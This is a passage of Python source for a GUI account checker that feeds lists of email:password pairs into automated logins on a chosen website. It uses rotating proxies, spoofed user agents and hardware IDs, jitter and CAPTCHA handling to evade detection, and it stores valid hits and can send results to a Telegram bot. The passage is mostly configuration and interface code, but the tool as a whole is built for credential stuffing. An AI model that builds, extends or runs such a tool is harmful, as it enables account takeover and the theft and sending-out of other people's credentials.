        messagebox.showerror("Input Error", "Email, Password, and Submit CSS selectors are required.")
        return

    # Get Capture Settings
    capture_settings = {
        "css_selectors": {},
        "inner_html_capture": var_inner_html_capture.get(),
        "outer_html_capture": var_outer_html_capture.get(),
        "redirect_link": redirect_url if redirect_url else None,
        "cleanup_enabled": var_cleanup_enabled.get(),
        "telegram": {
            "enabled": var_telegram_enabled.get(),
            "bot_token": capture_telegram_bot_token.get().strip(),
            "chat_id": capture_telegram_chat_id.get().strip(),
        },
        "speed_percentage": 500,  # Default speed percentage
        "incognito_mode": var_incognito_mode.get(),
        "css_selectors": css_selectors,
    }

    # Collect CSS Selectors from Capture Settings
    for frame in capture_css_selector_frames:
        selector = frame["selector_entry"].get().strip()
        key = frame["key_entry"].get().strip()
        if key in entry_placeholders:
            key = ''
        if selector in entry_placeholders:
            selector = ''
        if selector and key:
            capture_settings["css_selectors"][key] = selector

    # Collect Sleep Durations
    try:
        sleep_email = float(entry_sleep_email.get())
        sleep_password = float(entry_sleep_password.get())
        sleep_submit = float(entry_sleep_submit.get())

        if not (0 <= sleep_email <= 100 and 0 <= sleep_password <= 100 and 0 <= sleep_submit <= 100):
            messagebox.showerror(
                "Invalid Sleep Duration",
                "Sleep durations must be between 0 and 100 seconds.",
            )
            return
    except ValueError:
        messagebox.showerror(
            "Invalid Sleep Duration", "Please enter valid numbers for sleep durations."
        )
        return

    sleep_durations = {
        "sleep_email": sleep_email,
        "sleep_password": sleep_password,
        "sleep_submit": sleep_submit,
    }

    # Get usernames and passwords
    usernames_and_passwords = []
    raw_accounts = text_usernames_passwords.get("1.0", tk.END).strip().split("\n")
    for line in raw_accounts:
        if line:
            parts = line.strip().split(":")
            if len(parts) == 2:
                email, password = parts
                if not account_already_checked((email, password), db_name):
                    usernames_and_passwords.append((email, password))
            else:
                print_action(
                    f"{Fore.YELLOW}Invalid account format skipped: {line}{Style.RESET_ALL}"
                )

    if not usernames_and_passwords:
        messagebox.showinfo("No Accounts", "No new accounts to check.")
        return

    # Create results folder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_folder = os.path.join(os.getcwd(), f"results_{timestamp}")
    os.makedirs(results_folder, exist_ok=True)
    print_action(
        f"{Fore.CYAN}Results will be saved in: {results_folder}{Style.RESET_ALL}"
    )

    # Disable the Check Accounts button to prevent multiple runs
    btn_check_accounts.config(state=tk.DISABLED)
    btn_force_stop.config(state=tk.NORMAL)

    # Gather additional settings
    proxy_enabled = var_proxy_enabled.get()
    proxy_type = proxy_type_var.get()
    proxy_mode = proxy_mode_var.get()
    load_extensions = var_load_extensions.get()
    disable_notifications = var_disable_notifications.get()
    disable_infobars = var_disable_infobars.get()
    start_maximized = var_start_maximized.get()
    disable_extensions_option = var_disable_extensions_option.get()
    headless = var_headless.get()
    use_custom_user_agents = var_custom_user_agents.get()
    custom_user_agents = None
    proxies_list = proxies.copy()
    proxy_path = var_proxy_list_path.get().strip()
    if proxy_enabled and proxy_path:
        if os.path.exists(proxy_path):
            try:
                with open(proxy_path, "r", encoding='utf-8') as f:
                    proxies_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print_action(f"{Fore.CYAN}[Stealth] Proxies overridden: loaded {len(proxies_list)} from stealth path.{Style.RESET_ALL}")
            except Exception as e:
                print_action(f"{Fore.YELLOW}[Stealth] Failed to load proxies from {proxy_path}: {e}{Style.RESET_ALL}")
        else:
            print_action(f"{Fore.YELLOW}[Stealth] Proxy list path does not exist, falling back to default proxies array.{Style.RESET_ALL}")
            
    # ----------------------------------------------------------------
    # Load proxies into the thread-safe ProxyRotator singleton so that
    # concurrent account threads can safely call ProxyRotator.get_next()
    # without race conditions on the proxy index.
    # ----------------------------------------------------------------
    if proxy_enabled and proxies_list:
        ProxyRotator.load(proxies_list, mode=proxy_mode)
        print_action(
            f"{Fore.CYAN}[ProxyRotator] Loaded {ProxyRotator.count()} proxies "
            f"(mode={proxy_mode}).{Style.RESET_ALL}"
        )
    else:
        # Ensure the rotator is reset so stale entries from a previous run
        # do not leak into the new run.
        ProxyRotator.load([], mode=proxy_mode)

    chromedriver_args_to_use = chromedriver_args_list.copy()  # Use a copy to prevent modification

    # Handle Custom User Agents
    if use_custom_user_agents:
        if not custom_user_agents_file:
            messagebox.showerror(
                "User Agents Error", "Custom User Agents file not selected."
            )
            btn_check_accounts.config(state=tk.NORMAL)
            btn_force_stop.config(state=tk.DISABLED)
            return
        try:
            with open(custom_user_agents_file, "r", encoding='utf-8') as f:
                custom_user_agents = [line.strip() for line in f if line.strip()]
            if not custom_user_agents:
                messagebox.showerror(
                    "User Agents Error", "Custom User Agents file is empty."
                )
                btn_check_accounts.config(state=tk.NORMAL)
                btn_force_stop.config(state=tk.DISABLED)
                return
            print_action(
                f"{Fore.GREEN}Custom User Agents loaded successfully.{Style.RESET_ALL}"
            )
        except Exception as e:
            messagebox.showerror(
                "User Agents Error", f"Failed to read user agents file: {e}"
            )
            btn_check_accounts.config(state=tk.NORMAL)
            btn_force_stop.config(state=tk.DISABLED)
            return

    # Handle Invalid Account Implementation
    invalid_account_settings = {
        "enable": var_invalid_account_enabled.get(),
        "redirect_detection": get_entry_value(entry_invalid_redirect),
        "error_alert_css_selector": get_entry_value(entry_invalid_error_selector),
        "inner_html": get_entry_value(entry_invalid_inner_html),
        "outer_html": get_entry_value(entry_invalid_outer_html),
    }

    # Gather dynamic proxy settings
    dynamic_proxy_enabled = var_dynamic_proxy_enabled.get()
    proxy_source_url = var_proxy_source_url.get().strip()
    try:
        proxy_fetch_interval = int(var_proxy_fetch_interval.get())
    except ValueError:
        proxy_fetch_interval = 60

    # Gather Stealth Settings
    stealth_settings_dict = {
        "reinstall": var_reinstall.get(),
        "jitter": var_jitter.get(),
        "isolation": var_isolation.get(),
        "hwid_spoof": var_hwid_spoof.get(),
        "openrouter_keys": [k.strip() for k in var_openrouter_keys.get().split(',') if k.strip()],
        "openrouter_model": var_openrouter_model.get().strip(),
        "proxy_list_path": var_proxy_list_path.get().strip(),
        "cookie_list_path": var_cookie_list_path.get().strip(),
    }

    # Handle CAPTCHA Input Wrong Implementation
    captcha_wrong_settings = {
        "enable": var_captcha_wrong_enabled.get(),
        "redirect_detection": get_entry_value(entry_captcha_redirect),
        "error_alert_css_selector": get_entry_value(entry_captcha_error_selector),
        "inner_html": get_entry_value(entry_captcha_inner_html),
        "outer_html": get_entry_value(entry_captcha_outer_html),
    }

    # Start the account checking in a new thread
    threading.Thread(
        target=run_account_checks,
        args=(
            usernames_and_passwords,
            website_target_link,
            website_valid_link,
            db_name,
            custom_valid_link,
            results_folder,
            user_data_dir,
            profile_name,
            capture_settings,
            sleep_durations,
            proxy_enabled,
            proxy_type,
            proxy_mode,
            custom_user_agents,
            load_extensions,
            disable_notifications,
            disable_infobars,
            start_maximized,
            disable_extensions_option,
            headless,
            chromedriver_args_to_use,
            invalid_account_settings,
            captcha_wrong_settings,
            proxies_list,
            stealth_settings_dict,
            dynamic_proxy_enabled,
            proxy_source_url,
            proxy_fetch_interval,
        ),
        daemon=True,
    ).start()


def import_proxies_from_file():
    """Imports proxies from a selected file."""
    global proxies  # Use the global list 'proxies'
    file_path = filedialog.askopenfilename(
        initialdir=os.getcwd(),
        title="Select Proxy File",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        with open(file_path, "r", encoding='utf-8') as file:
            proxies.clear()
            for line in file:
                proxy_line = line.strip()
                # Handle proxies with or without authentication
                if "@" in proxy_line:
                    # Format: username:password@ip:port
                    proxies.append(proxy_line)  # Keep the complete proxy string
                else:
                    # Format: ip:port
                    proxies.append(proxy_line)
        if proxies:
            print_action(
                f"{Fore.GREEN}Proxies imported successfully from {file_path}.{Style.RESET_ALL}"
            )
        else:
            print_action(
                f"{Fore.RED}No valid proxies found in {file_path}.{Style.RESET_ALL}"
            )
    else:
        print_action(f"{Fore.RED}No file selected for proxies.{Style.RESET_ALL}")


def select_user_agents_file():
    """Allows the user to select a user agents TXT file."""
    global custom_user_agents_file
    file_path = filedialog.askopenfilename(
        initialdir=os.getcwd(),
        title="Select User Agents File",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        custom_user_agents_file = file_path
        print_action(
            f"{Fore.GREEN}User Agents file selected: {file_path}{Style.RESET_ALL}"
        )
    else:
        print_action(f"{Fore.RED}No User Agents file selected.{Style.RESET_ALL}")


def create_config():
    """Opens a window for creating a new config file."""
    global config_file_path

    def save_config():
        global config_file_path
        config_name = entry_config_name.get().strip()
        if not config_name:
            messagebox.showerror("Input Error", "Please enter a config file name.")
            return
        file_path = filedialog.asksaveasfilename(
            initialdir=os.getcwd(),
            initialfile=config_name,
            defaultextension=".txt",
            filetypes=(("Text Files", "*.txt"),),
        )
        if file_path:
            config_file_path = file_path
            config_window.destroy()
            messagebox.showinfo(
                "Config Saved", f"Configuration saved to {file_path}"
            )
            save_config_data(config_file_path)  # Save the config data to the file

    config_window = tk.Toplevel(window)
    config_window.title("Create New Config")
    config_window.geometry("400x150")

    ttk.Label(
        config_window,
        text="Enter a name for the new config file (e.g., 'my_config.txt'):",
    ).pack(padx=10, pady=10)
    entry_config_name = ttk.Entry(config_window, width=40)
    entry_config_name.pack(padx=10, pady=5)

    ttk.Button(config_window, text="Save Config", command=save_config).pack(pady=10)


def import_config():
    """Opens a window for importing an existing config file."""
    global config_file_path
    file_path = filedialog.askopenfilename(
        initialdir=os.getcwd(),
        title="Import Config",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        config_file_path = file_path
        try:
            load_config_data(
                file_path,
                entry_website_target_link,
                entry_website_valid_link,
                entry_css_selector_email,
                entry_css_selector_password,
                entry_css_selector_submit,
                entry_sleep_submit,
                entry_css_selector_next_button,
    entry_css_selector_next_button_password,
                entry_sleep_email,
                entry_invalid_redirect,
                entry_invalid_error_selector,
                entry_invalid_inner_html,
                entry_invalid_outer_html,
                entry_captcha_redirect,
                entry_captcha_error_selector,
                entry_captcha_inner_html,
                entry_captcha_outer_html,
                entry_redirect_link,
                # Capture Settings
                var_inner_html_capture,
                var_outer_html_capture,
                var_telegram_enabled,
                capture_telegram_bot_token,
                capture_telegram_chat_id,
                # Capture CSS Selectors
                capture_css_selector_frames,
            )
            messagebox.showinfo(
                "Config Imported",
                f"Configuration imported from {file_path}",
            )
        except Exception as e:
            print_action(
                f"{Fore.RED}An error occurred while importing config: {e}{Style.RESET_ALL}"
            )
            messagebox.showerror(
                "Import Error", f"An error occurred while importing config: {e}"
            )


def export_config():
    """Opens a window for exporting the current config file."""
    global config_file_path
    file_path = filedialog.asksaveasfilename(
        initialdir=os.getcwd(),
        defaultextension=".txt",
        filetypes=(("Text Files", "*.txt"),),
    )
    if file_path:
        config_file_path = file_path
        try:
            save_config_data(config_file_path)
            messagebox.showinfo(
                "Config Exported",
                f"Configuration exported to {file_path}",
            )
        except Exception as e:
            print_action(
                f"{Fore.RED}An error occurred while exporting config: {e}{Style.RESET_ALL}"
            )
            messagebox.showerror(
                "Export Error", f"An error occurred while exporting config: {e}"
            )

def export_db_to_csv():
    """Exports the checked_accounts.db SQLite database to CSV format."""
    file_path = filedialog.asksaveasfilename(
        initialdir=os.getcwd(),
        defaultextension=".csv",
        filetypes=(("CSV Files", "*.csv"),),
        title="Export Database to CSV",
    )
    if file_path:
        success = SQLiteCSVExporter.export_table_to_csv(db_name, "accounts", file_path)
        if success:
            messagebox.showinfo(
                "Export Successful",
                f"Database successfully exported to {file_path}",
            )
        else:
            messagebox.showerror(
                "Export Error",
                "Failed to export database to CSV. Check logs or verify database contains data.",
            )


def save_config_state():
    """Saves the current state of the config to a file."""
    global config_file_path

    if not config_file_path:
        create_config()  # Prompt user to create a config file if none exists
        return

    if config_file_path:
        try:
            save_config_data(config_file_path)
            print_action(
                f"{Fore.GREEN}Config state saved to: {config_file_path}{Style.RESET_ALL}"
            )
        except Exception as e:
            print_action(
                f"{Fore.RED}An error occurred while saving config state: {e}{Style.RESET_ALL}"
            )
            messagebox.showerror(
                "Save Error", f"An error occurred while saving config state: {e}"
            )


def load_config_data(
    file_path,
    entry_website_target_link,
    entry_website_valid_link,
    entry_css_selector_email,
    entry_css_selector_password,
    entry_css_selector_submit,
    entry_sleep_submit,
    entry_css_selector_next_button,
    entry_css_selector_next_button_password,
    entry_sleep_email,
    entry_invalid_redirect,
    entry_invalid_error_selector,
    entry_invalid_inner_html,
    entry_invalid_outer_html,
    entry_captcha_redirect,
    entry_captcha_error_selector,
    entry_captcha_inner_html,
    entry_captcha_outer_html,
    entry_redirect_link,
    # Capture Settings
    var_inner_html_capture,
    var_outer_html_capture,
    var_telegram_enabled,
    capture_telegram_bot_token,
    capture_telegram_chat_id,
    # Capture CSS Selectors
    capture_css_selector_frames,
):
    """Loads config data from a file."""
    try:
        with open(file_path, "r", encoding='utf-8') as file:
            lines = file.readlines()
            current_css_selector_key = None
            for line in lines:
                parts = line.strip().split("=", 1)
                if len(parts) == 2:  # Ensure each line has key=value format
                    key, value = parts
                    if key == "website_target_link":
                        entry_website_target_link.delete(0, tk.END)
                        entry_website_target_link.insert(0, value)
                    elif key == "website_valid_link":
                        entry_website_valid_link.delete(0, tk.END)
                        entry_website_valid_link.insert(0, value)
                    elif key == "redirect_url":
                        entry_redirect_link.delete(0, tk.END)
                        entry_redirect_link.insert(0, value)
                    elif key == "css_selector_email":
                        entry_css_selector_email.delete(0, tk.END)
                        entry_css_selector_email.insert(0, value)
                    elif key == "css_selector_password":
                        entry_css_selector_password.delete(0, tk.END)
                        entry_css_selector_password.insert(0, value)
                    elif key == "css_selector_submit":
                        entry_css_selector_submit.delete(0, tk.END)
                        entry_css_selector_submit.insert(0, value)
                    elif key == "sleep_submit":
                        entry_sleep_submit.delete(0, tk.END)
                        entry_sleep_submit.insert(0, value)
                    elif key == "css_selector_next_button":
                        entry_css_selector_next_button.delete(0, tk.END)
                        entry_css_selector_next_button.insert(0, value)
                    elif key == "css_selector_next_button_password":
                        entry_css_selector_next_button_password.delete(0, tk.END)
                        entry_css_selector_next_button_password.insert(0, value)
                    elif key == "sleep_email":
                        entry_sleep_email.delete(0, tk.END)
                        entry_sleep_email.insert(0, value)
                    elif key == "invalid_redirect":
                        entry_invalid_redirect.delete(0, tk.END)
                        entry_invalid_redirect.insert(0, value)
                    elif key == "invalid_error_selector":
                        entry_invalid_error_selector.delete(0, tk.END)
                        entry_invalid_error_selector.insert(0, value)
                    elif key == "invalid_inner_html":
                        entry_invalid_inner_html.delete(0, tk.END)
                        entry_invalid_inner_html.insert(0, value)
                    elif key == "invalid_outer_html":
                        entry_invalid_outer_html.delete(0, tk.END)
                        entry_invalid_outer_html.insert(0, value)
                    elif key == "captcha_redirect":
                        entry_captcha_redirect.delete(0, tk.END)
                        entry_captcha_redirect.insert(0, value)
                    elif key == "captcha_error_selector":
                        entry_captcha_error_selector.delete(0, tk.END)
                        entry_captcha_error_selector.insert(0, value)
                    elif key == "captcha_inner_html":
                        entry_captcha_inner_html.delete(0, tk.END)
                        entry_captcha_inner_html.insert(0, value)
                    elif key == "captcha_outer_html":
                        entry_captcha_outer_html.delete(0, tk.END)
                        entry_captcha_outer_html.insert(0, value)
                    elif key == "redirect_link":
                        entry_redirect_link.delete(0, tk.END)
                        entry_redirect_link.insert(0, value)
                    elif key == "inner_html_capture":
                        var_inner_html_capture.set(value.lower() == "true")
                    elif key == "outer_html_capture":
                        var_outer_html_capture.set(value.lower() == "true")
                    elif key == "telegram_enabled":
                        var_telegram_enabled.set(value.lower() == "true")
                    elif key == "telegram_bot_token":
                        capture_telegram_bot_token.set(value)
                    elif key == "telegram_chat_id":
                        capture_telegram_chat_id.set(value)
                    elif key == "openrouter_keys":
                        var_openrouter_keys.set(value)
                    elif key == "openrouter_model":
                        var_openrouter_model.set(value)
                    elif key == "proxy_list_path":
                        var_proxy_list_path.set(value)
                    elif key == "cookie_list_path":
                        var_cookie_list_path.set(value)
                    elif key == "isolation_enabled":
                        var_isolation.set(value.lower() == "true")
                    elif key == "jitter_enabled":
                        var_jitter.set(value.lower() == "true")
                    elif key == "reinstall_enabled":
                        var_reinstall.set(value.lower() == "true")
                    elif key == "hwid_spoof_enabled":
                        var_hwid_spoof.set(value.lower() == "true")
                    elif key == "log_ingestion_enabled":
                        var_log_ingestion_enabled.set(value.lower() == "true")
                    elif key == "log_ingestion_isolate":
                        var_log_ingestion_isolate.set(value.lower() == "true")
                    elif key.startswith("css_selector_key_"):
                        current_css_selector_key = value
                    elif key.startswith("css_selector_"):
                        if current_css_selector_key:
                            selector = value
                            add_capture_css_selector_frame(
                                key=current_css_selector_key,
                                selector=selector,
                                load=True,
                            )
                            current_css_selector_key = None

        print_action(
            f"{Fore.GREEN}Configuration loaded successfully from {file_path}.{Style.RESET_ALL}"
        )
    except FileNotFoundError:
        print_action(f"{Fore.RED}Config file not found: {file_path}{Style.RESET_ALL}")
        messagebox.showerror("Load Error", f"Config file not found: {file_path}")
    except ValueError:
        print_action(
            f"{Fore.RED}Error loading config file: {file_path}. Make sure it's in the correct format (key=value).{Style.RESET_ALL}"
        )
        messagebox.showerror(
            "Load Error",
            f"Error loading config file: {file_path}. Make sure it's in the correct format (key=value).",
        )
    except Exception as e:
        print_action(
            f"{Fore.RED}An unexpected error occurred while loading config: {e}{Style.RESET_ALL}"
        )
        messagebox.showerror(
            "Load Error", f"An unexpected error occurred while loading config: {e}"
        )


def save_config_data(file_path):
    """Saves config data to a file."""
    try:
        with open(file_path, "w", encoding='utf-8') as file:
            file.write(f"website_target_link={entry_website_target_link.get()}\n")
            file.write(f"website_valid_link={entry_website_valid_link.get()}\n")
            file.write(f"redirect_url={entry_redirect_link.get()}\n")
            file.write(f"css_selector_email={entry_css_selector_email.get()}\n")
            file.write(f"sleep_email={entry_sleep_email.get()}\n")
            file.write(f"css_selector_password={entry_css_selector_password.get()}\n")
            file.write(f"sleep_password={entry_sleep_password.get()}\n")
            file.write(f"css_selector_submit={entry_css_selector_submit.get()}\n")
            file.write(f"sleep_submit={entry_sleep_submit.get()}\n")
            file.write(
                f"css_selector_next_button={entry_css_selector_next_button.get()}\n"
            )
            file.write(
                f"css_selector_next_button_password={entry_css_selector_next_button_password.get()}\n"
            )
            file.write(f"invalid_redirect={entry_invalid_redirect.get()}\n")
            file.write(
                f"invalid_error_selector={entry_invalid_error_selector.get()}\n"
            )
            file.write(f"invalid_inner_html={entry_invalid_inner_html.get()}\n")
            file.write(f"invalid_outer_html={entry_invalid_outer_html.get()}\n")
            file.write(f"captcha_redirect={entry_captcha_redirect.get()}\n")
            file.write(
                f"captcha_error_selector={entry_captcha_error_selector.get()}\n"
            )
            file.write(f"captcha_inner_html={entry_captcha_inner_html.get()}\n")
            file.write(f"captcha_outer_html={entry_captcha_outer_html.get()}\n")
            file.write(f"redirect_link={entry_redirect_link.get()}\n")
            # Capture Settings
            file.write(f"inner_html_capture={var_inner_html_capture.get()}\n")
            file.write(f"outer_html_capture={var_outer_html_capture.get()}\n")
            file.write(f"telegram_enabled={var_telegram_enabled.get()}\n")
            file.write(
                f"telegram_bot_token={capture_telegram_bot_token.get().strip()}\n"
            )
            file.write(f"telegram_chat_id={capture_telegram_chat_id.get().strip()}\n")
            # Stealth Settings
            file.write(f"openrouter_keys={var_openrouter_keys.get().strip()}\n")
            file.write(f"openrouter_model={var_openrouter_model.get().strip()}\n")
            file.write(f"proxy_list_path={var_proxy_list_path.get().strip()}\n")
            file.write(f"cookie_list_path={var_cookie_list_path.get().strip()}\n")
            file.write(f"isolation_enabled={var_isolation.get()}\n")
            file.write(f"jitter_enabled={var_jitter.get()}\n")
            file.write(f"reinstall_enabled={var_reinstall.get()}\n")
            file.write(f"hwid_spoof_enabled={var_hwid_spoof.get()}\n")
            # Log Ingestion Engine
            file.write(f"log_ingestion_enabled={var_log_ingestion_enabled.get()}\n")
            file.write(f"log_ingestion_isolate={var_log_ingestion_isolate.get()}\n")
            
            # Capture CSS Selectors
            for idx, frame in enumerate(capture_css_selector_frames, start=1):
                key = frame["key_entry"].get().strip()
                selector = frame["selector_entry"].get().strip()
                if key and selector:
                    file.write(f"css_selector_key_{idx}={key}\n")
                    file.write(f"css_selector_{idx}={selector}\n")
        print_action(f"{Fore.GREEN}Configuration saved to {file_path}.{Style.RESET_ALL}")
    except Exception as e:
        print_action(f"{Fore.RED}Failed to save configuration: {e}{Style.RESET_ALL}")
        messagebox.showerror("Save Error", f"Failed to save configuration: {e}")


def reset_to_default():
    """Resets all GUI entries to their default values."""
    entry_website_target_link.delete(0, tk.END)
    entry_website_target_link.insert(0, "Enter value here...")
    entry_website_target_link.config(foreground="grey")

    entry_website_valid_link.delete(0, tk.END)
    entry_website_valid_link.insert(0, "Enter value here...")
    entry_website_valid_link.config(foreground="grey")

    entry_redirect_link.delete(0, tk.END)
    entry_redirect_link.insert(0, "Enter redirect link here...")
    entry_redirect_link.config(foreground="grey")

    entry_css_selector_email.delete(0, tk.END)
    entry_css_selector_email.insert(0, "Enter value here...")
    entry_css_selector_email.config(foreground="grey")

    entry_css_selector_password.delete(0, tk.END)
    entry_css_selector_password.insert(0, "Enter value here...")
    entry_css_selector_password.config(foreground="grey")

    entry_css_selector_submit.delete(0, tk.END)
    entry_css_selector_submit.insert(0, "Enter value here...")
    entry_css_selector_submit.config(foreground="grey")

    entry_css_selector_next_button.delete(0, tk.END)
    entry_css_selector_next_button.insert(0, "Enter value here...")
    entry_css_selector_next_button.config(foreground="grey")
    entry_css_selector_next_button_password.delete(0, tk.END)
    entry_css_selector_next_button_password.insert(0, "Enter value here...")
    entry_css_selector_next_button_password.config(foreground="grey")

    # Reset Sleep Durations
    entry_sleep_email.delete(0, tk.END)
    entry_sleep_email.insert(0, "25")  # Default sleep email

    entry_sleep_password.delete(0, tk.END)
    entry_sleep_password.insert(0, "25")  # Default sleep password

    entry_sleep_submit.delete(0, tk.END)
    entry_sleep_submit.insert(0, "25")  # Default sleep submit

    # Reset Invalid Account Fields
    entry_invalid_redirect.delete(0, tk.END)
    entry_invalid_redirect.insert(0, "Enter value here...")
    entry_invalid_redirect.config(foreground="grey")

    entry_invalid_error_selector.delete(0, tk.END)
    entry_invalid_error_selector.insert(0, "Enter value here...")
    entry_invalid_error_selector.config(foreground="grey")

    entry_invalid_inner_html.delete(0, tk.END)
    entry_invalid_inner_html.insert(0, "Enter value here...")
    entry_invalid_inner_html.config(foreground="grey")

    entry_invalid_outer_html.delete(0, tk.END)
    entry_invalid_outer_html.insert(0, "Enter value here...")
    entry_invalid_outer_html.config(foreground="grey")

    # Reset CAPTCHA Wrong Fields
    entry_captcha_redirect.delete(0, tk.END)
    entry_captcha_redirect.insert(0, "Enter value here...")
    entry_captcha_redirect.config(foreground="grey")

    entry_captcha_error_selector.delete(0, tk.END)
    entry_captcha_error_selector.insert(0, "Enter value here...")
    entry_captcha_error_selector.config(foreground="grey")

    entry_captcha_inner_html.delete(0, tk.END)
    entry_captcha_inner_html.insert(0, "Enter value here...")
    entry_captcha_inner_html.config(foreground="grey")

    entry_captcha_outer_html.delete(0, tk.END)
    entry_captcha_outer_html.insert(0, "Enter value here...")
    entry_captcha_outer_html.config(foreground="grey")

    # Reset Redirect Link
    entry_redirect_link.delete(0, tk.END)
    entry_redirect_link.insert(0, "Enter redirect link here...")
    entry_redirect_link.config(foreground="grey")

    # Reset Capture Settings
    var_inner_html_capture.set(False)
    var_outer_html_capture.set(False)
    var_telegram_enabled.set(False)
    capture_telegram_bot_token.set("")
    capture_telegram_chat_id.set("")

    # Reset Capture CSS Selectors
    for frame in capture_css_selector_frames:
        frame["frame"].destroy()
    capture_css_selector_frames.clear()

    # Add a default capture CSS selector frame
    add_capture_css_selector_frame()

    var_proxy_enabled.set(False)  # Reset proxy toggle
    var_load_extensions.set(False)  # Reset load extensions toggle
    var_disable_notifications.set(False)  # Reset disable notifications
    var_disable_infobars.set(False)  # Reset disable infobars
    var_start_maximized.set(False)  # Reset start maximized
    var_disable_extensions_option.set(False)  # Reset disable extensions option
    var_headless.set(False)  # Reset headless option
    var_custom_user_agents.set(False)  # Reset custom user agents toggle
    var_enable_mouse_clicks.set(False)  # Reset mouse clicks toggle
    var_incognito_mode.set(False)  # Reset incognito mode toggle
    var_invalid_account_enabled.set(False)  # Reset Invalid Account toggle
    var_captcha_wrong_enabled.set(False)  # Reset CAPTCHA Wrong toggle
    var_use_database.set(True)  # Reset database toggle to default ON
    var_capture_screenshot.set(True)  # Reset screenshot capture to default ON

    # Reset Advanced Stealth Settings
    var_openrouter_keys.set("")
    var_openrouter_model.set("gpt-3.5-turbo")
    var_proxy_list_path.set("")
    var_cookie_list_path.set("")
    var_isolation.set(True)
    var_developer_mode.set(True)  # Reset Developer Mode toggle
    var_jitter.set(False)
    var_reinstall.set(False)
    var_hwid_spoof.set(False)
    # Reset Log Ingestion Engine settings
    var_log_ingestion_enabled.set(False)
    var_log_ingestion_isolate.set(True)

    # Reset Mouse Click Frames
    for frame in mouse_click_frames:
        frame["x_entry"].delete(0, tk.END)
        frame["y_entry"].delete(0, tk.END)
        frame["num_clicks_entry"].delete(0, tk.END)
        frame["interval_entry"].delete(0, tk.END)
        frame["frame"].destroy()

    for frame in css_click_frames:
        frame["selector_entry"].delete(0, tk.END)
        frame["num_clicks_entry"].delete(0, tk.END)
        frame["interval_entry"].delete(0, tk.END)
        frame["frame"].destroy()

    # Reset Chromedriver Arguments
    chromedriver_args_list.clear()
    listbox_chromedriver_args.delete(0, tk.END)

    messagebox.showinfo("Reset", "All fields have been reset to default.")

    # Clear mouse click frames list
    mouse_click_frames.clear()
    css_click_frames.clear()


# -------------------
# Capture Settings Functions
# -------------------
capture_css_selector_frames = []


def add_capture_css_selector_frame(key="", selector="", load=False):
    """Adds a new CSS selector frame in Capture Settings."""
    frame = ttk.Frame(frame_capture_css_selectors)
    frame.pack(padx=10, pady=5, fill="x")

    ttk.Label(frame, text="Key Name:").grid(
        column=0, row=0, padx=5, pady=2, sticky="e"
    )
    key_entry = ttk.Entry(frame, width=20)
    key_entry.grid(column=1, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        key_entry, "Enter a unique key name for the CSS selector (e.g., Username)."
    )

    ttk.Label(frame, text="CSS Selector:").grid(
        column=2, row=0, padx=5, pady=2, sticky="e"
    )
    selector_entry = ttk.Entry(frame, width=50)
    selector_entry.grid(column=3, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(selector_entry, "Enter the CSS selector for the element.")

    remove_button = ttk.Button(
        frame, text="-", command=lambda f=frame: remove_capture_css_selector_frame(f)
    )
    remove_button.grid(column=4, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        remove_button,
        "Remove this CSS selector entry.",
    )

    if load:
        key_entry.insert(0, key)
        selector_entry.insert(0, selector)

    capture_css_selector_frames.append(
        {
            "frame": frame,
            "key_entry": key_entry,
            "selector_entry": selector_entry,
        }
    )


def remove_capture_css_selector_frame(frame):
    """Removes a CSS selector frame from Capture Settings."""
    for css_frame in capture_css_selector_frames:
        if css_frame["frame"] == frame:
            css_frame["frame"].destroy()
            capture_css_selector_frames.remove(css_frame)
    if not capture_css_selector_frames:
        add_capture_css_selector_frame()


def add_capture_settings():
    """Initializes capture settings with default CSS selector."""
    add_capture_css_selector_frame()


# -------------------
# Mouse Click Automation Functions
# -------------------
def add_mouse_click_action_extended():
    """Adds a new mouse click action frame."""
    frame = ttk.Frame(frame_mouse_clicks)
    frame.pack(padx=10, pady=5, fill="x")

    ttk.Label(frame, text="X:").grid(column=0, row=0, padx=5, pady=2, sticky="e")
    x_entry = ttk.Entry(frame, width=10)
    x_entry.grid(column=1, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        x_entry, "Enter the X coordinate for the click location."
    )

    ttk.Label(frame, text="Y:").grid(column=2, row=0, padx=5, pady=2, sticky="e")
    y_entry = ttk.Entry(frame, width=10)
    y_entry.grid(column=3, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        y_entry, "Enter the Y coordinate for the click location."
    )

    ttk.Label(frame, text="Number of Clicks:").grid(
        column=4, row=0, padx=5, pady=2, sticky="e"
    )
    num_clicks_entry = ttk.Entry(frame, width=10)
    num_clicks_entry.grid(column=5, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        num_clicks_entry,
        "Enter how many times to click at this location during one account check.",
    )

    ttk.Label(frame, text="Time Interval (s):").grid(
        column=6, row=0, padx=5, pady=2, sticky="e"
    )
    interval_entry = ttk.Entry(frame, width=10)
    interval_entry.grid(column=7, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        interval_entry, "Enter the interval in seconds between each click."
    )

    remove_button = ttk.Button(
        frame,
        text="-",
        command=lambda f=frame: remove_mouse_click_action_extended(f),
    )
    remove_button.grid(column=8, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(remove_button, "Remove this click action.")

    # Store references for retrieval
    mouse_click_frames.append(
        {
            "frame": frame,
            "x_entry": x_entry,
            "y_entry": y_entry,
            "num_clicks_entry": num_clicks_entry,
            "interval_entry": interval_entry,
        }
    )


def remove_mouse_click_action_extended(frame):
    """Removes a mouse click action frame."""
    for click_frame in mouse_click_frames:
        if click_frame["frame"] == frame:
            click_frame["frame"].destroy()
            mouse_click_frames.remove(click_frame)
            break
    if not mouse_click_frames:
        add_mouse_click_action_extended()


def add_css_click_action():
    """Adds a new CSS Selector click action frame."""
    frame = ttk.Frame(frame_css_clicks)
    frame.pack(padx=10, pady=5, fill="x")

    ttk.Label(frame, text="CSS Selector:").grid(column=0, row=0, padx=5, pady=2, sticky="e")
    selector_entry = ttk.Entry(frame, width=50)
    selector_entry.grid(column=1, row=0, padx=5, pady=2, sticky="w")
    CreateToolTip(
        selector_entry, "Enter the CSS selector for the element to click."
    )

